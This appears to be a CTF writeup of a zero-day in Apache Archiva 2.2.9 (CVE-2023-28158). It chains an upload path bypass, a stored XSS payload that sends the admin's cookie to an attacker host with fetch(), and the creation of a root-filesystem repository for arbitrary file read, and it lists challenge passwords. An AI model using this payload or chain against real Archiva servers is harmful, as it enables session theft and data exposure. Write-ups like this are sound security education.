title = "hxp | hxp CTF 2022: archived writeup"
description = "hxp is a CTF team."
full_description = '''Writeup to the zero-day challenge archived of our recent CTF targeting Apache Archiva, version 2.2.9. The vulnerability of this challenge got CVE-2023-28158. The setup has two users pre-set: ctf with password H4v3Fun, having artifact upload rights and admin with an unknown password, having full admin rights. The goal is to elevate the ctf users privileges and gain arbitrary read access to the server. The admin (see admin.py supplied with the challenge) only accesses http://localhost:8055/repository/internal. The goal is also to somehow store an XSS payload in the internal repository root. Calling the save endpoint triggers DefaultFileUploadService.java#save (code) which later triggers DefaultFileUploadService.java#saveFile gets called with the arguments: The upload form does not spaces since the input of these arguments, but they can be sent directly bypassing the frontend. At the server, the input is trimmed, leading to empty variables, and the uploaded file to be stored in /archiva-data/repositories/internal/ directly. When accessing http://localhost:8055/repository/internal/, the direct repository view (WebDAV) will format to the file like following: Starting from this PoC, we write simple cookie extraction code <img src=a onerror="fetch(String.fromCharCode(47)+String.fromCharCode(47)+'{my_host}:{my_port}'+String.fromCharCode(47)+btoa(document.cookie))"> (we need to escape / since the server checks in DefaultFileUploadService.java#hasValidChars that / (FileSystems.getDefault().getSeparator()) is not in the string). Using the admin’s cookie, we can now elevate our own permissions or just wreak havoc using the admin account (redacted admin password for convenience reasons: hxp_l0ves_U_FwR1O0ZEL [the last bytes are just to prevent guessing]), but we still do not yet have access to /flag.txt on the server. If we ignore all warnings and errors, archiva will just create the repository which can be accessed via http://localhost:8055/repository/root/ giving us complete read access to the entire system.'''
